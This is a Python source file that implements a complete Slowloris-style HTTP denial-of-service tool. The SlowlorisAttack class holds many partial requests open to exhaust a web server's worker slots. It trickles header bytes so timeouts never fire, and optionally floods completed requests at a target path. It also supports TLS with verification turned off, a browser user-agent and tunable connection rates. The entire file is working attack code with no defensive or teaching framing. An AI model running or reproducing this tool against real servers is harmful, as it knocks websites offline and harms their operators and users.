import logging
import socket
import ssl
import threading
import time

logger = logging.getLogger(__name__)

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36")

UA = DEFAULT_UA


class SlowlorisAttack:
    """Mixed slow-HTTP / request engine.

    Target can be an IP *or* a URL:
      - self.target       = IP the socket connects to (resolved from a domain if needed)
      - self.host_header  = value for the Host: line (and TLS SNI) — usually a domain
      - self.path         = exact resource requested, e.g. /api/login
      - self.ssl_enabled  = True wraps the socket in TLS (https:// links)

    Per-socket lifecycle:
      1) partial request   -> occupies a server worker slot (slowloris)
      2) trickle bytes     -> server read-timeout never fires
      3) complete request  -> real HTTP traffic to the exact path, then back to phase 1
    """

    def __init__(self, target, port=80, max_conn=400, rate=80,
                 trickle_interval=1.0, mode="mixed",
                 path="/", host_header=None, ssl_enabled=False,
                 verify_ssl=False, on_heartbeat=None, on_error=None):
        self.target = target
        self.port = int(port)
        self.max_conn = int(max_conn)
        self.rate = int(rate)
        self.trickle_interval = float(trickle_interval)
        self.mode = mode                          # slow | flood | mixed
        self.path = path or "/"
        self.host_header = host_header or target
        self.ssl_enabled = bool(ssl_enabled)
        self.verify_ssl = bool(verify_ssl)
        self.on_heartbeat = on_heartbeat
        self.on_error = on_error

        self._ssl_ctx = None
        if self.ssl_enabled:
            if self.verify_ssl:
                self._ssl_ctx = ssl.create_default_context()
            else:
                self._ssl_ctx = ssl._create_unverified_context()

        self._lock = threading.Lock()
        self._sockets = {}                        # socket -> last activity ts
        self._stop = threading.Event()
        self._opened = 0
        self._failed = 0
        self._errors = {}                         # error name -> count
        self._last_beat = 0.0
        self.thread = None

    # ---------------- public API ----------------

    @property
    def is_running(self):
        return not self._stop.is_set() and self.thread and self.thread.is_alive()

    def stats(self):
        with self._lock:
            return {
                "target": self.target,
                "port": self.port,
                "path": self.path,
                "host_header": self.host_header,
                "ssl": self.ssl_enabled,
                "connections": len(self._sockets),
                "opened": self._opened,
                "failed": self._failed,
                "errors": dict(self._errors),
                "mode": self.mode,
                "rate": self.rate,
                "max_conn": self.max_conn,
                "trickle_interval": self.trickle_interval,
            }

    def start(self):
        self._stop.clear()
        self.thread = threading.Thread(
            target=self._keeper, daemon=True,
            name=f"attack-{self.host_header}:{self.port}")
        self.thread.start()
        logger.info("Attack started: %s://%s:%s%s (max=%s, rate=%s/s, mode=%s)",
                    "https" if self.ssl_enabled else "http",
                    self.host_header, self.port, self.path,
                    self.max_conn, self.rate, self.mode)

    def stop(self):
        self._stop.set()
        with self._lock:
            for s in list(self._sockets):
                self._close(s)
            self._sockets.clear()

    def set_rate(self, rate):
        with self._lock:
            self.rate = max(1, int(rate))

    def set_max_conn(self, n):
        with self._lock:
            self.max_conn = max(1, int(n))

    # ---------------- internals ----------------

    def _close(self, s):
        try:
            s.close()
        except OSError:
            pass

    def _record_error(self, exc, extra=""):
        name = type(exc).__name__
        if getattr(exc, "errno", None):
            name = socket.errorcode.get(exc.errno, name) or name
        if extra and not name.startswith(extra):
            name = f"{extra}:{name}"
        with self._lock:
            self._failed += 1
            self._errors[name] = self._errors.get(name, 0) + 1
        if self.on_error:
            try:
                self.on_error(name)
            except Exception:
                pass

    def _open_one(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            if self.ssl_enabled:
                # TLS handshake happens during connect(); SNI carries host_header
                s = self._ssl_ctx.wrap_socket(s, server_hostname=self.host_header)
                s.settimeout(10)
            s.connect((self.target, self.port))
            s.send(f"GET {self.path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host_header}\r\n".encode())
            s.send(f"User-Agent: {UA}\r\n".encode())
            s.send(b"Accept: */*\r\n")
            s.send(b"Connection: keep-alive\r\n")
            # NOTE: no terminating blank line yet -> server holds the worker
            s.settimeout(1.0)
            with self._lock:
                if self._stop.is_set():
                    self._close(s)
                    return
                self._sockets[s] = time.time()
                self._opened += 1
        except ssl.SSLError as e:
            self._record_error(e, extra="ssl")
            self._close(s)
        except OSError as e:
            self._record_error(e)
            self._close(s)

    def _prune(self):
        with self._lock:
            for s in list(self._sockets):
                try:
                    fileno_ok = s.fileno() != -1
                except (OSError, ValueError):
                    fileno_ok = False
                if not fileno_ok:
                    self._close(s)
                    self._sockets.pop(s, None)

    def _drain(self, s):
        """Non-blocking recv; return False if the peer closed the connection."""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    return False
                if len(chunk) < 65536:
                    return True
        except BlockingIOError:
            return True
        except OSError:
            return False

    def _trickle(self):
        now = time.time()
        with self._lock:
            for s in list(self._sockets):
                if now - self._sockets.get(s, now) >= self.trickle_interval:
                    try:
                        s.send(b"X-t: 1\r\n")            # keep-alive byte
                        self._sockets[s] = now
                    except OSError:
                        self._close(s)
                        self._sockets.pop(s, None)

    def _complete_requests(self):
        """Finish the HTTP request on a rotating subset -> real request churn."""
        with self._lock:
            pool = list(self._sockets)
        if not pool:
            return
        k = max(1, min(len(pool) // 3, 25))
        step = max(1, len(pool) // k)
        for i in range(0, len(pool), step):
            s = pool[i]
            with self._lock:
                if s not in self._sockets:
                    continue
            try:
                s.send(b"\r\n")                          # complete the request
                alive = self._drain(s)
                if not alive:
                    with self._lock:
                        self._close(s)
                        self._sockets.pop(s, None)
                    continue
                # reset: back to partial-request phase for the same socket
                s.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host_header}\r\n".encode())
                s.send(b"Accept: */*\r\n")
                with self._lock:
                    if s in self._sockets:
                        self._sockets[s] = time.time()
            except OSError:
                with self._lock:
                    self._close(s)
                    self._sockets.pop(s, None)

    def _keeper(self):
        next_open = 0.0
        tick = 0
        while not self._stop.is_set():
            now = time.time()
            self._prune()

            # ---- refill up to max_conn at `rate` conns/sec ----
            with self._lock:
                need = self.max_conn - len(self._sockets)
                rate = self.rate
            if need > 0 and now >= next_open:
                burst = min(need, rate, 64)               # pacing cap per pass
                for _ in range(burst):
                    if self._stop.is_set():
                        break
                    self._open_one()
                next_open = now + (burst / max(1, rate))  # spread over 1 second

            time.sleep(0.05)

            self._trickle()                                # every ~1s per socket
            tick += 1
            if self.mode in ("flood", "mixed") and tick % 2 == 0:
                self._complete_requests()

            if self.on_heartbeat and now - self._last_beat >= 15:
                self._last_beat = now
                try:
                    self.on_heartbeat(self.stats())
                except Exception:
                    pass

            # if every connection is being refused, back off briefly
            with self._lock:
                if self._failed > 50 and not self._sockets:
                    time.sleep(1.0)

        logger.info("Attack stopped: %s:%s", self.host_header, self.port)
        self.stop()
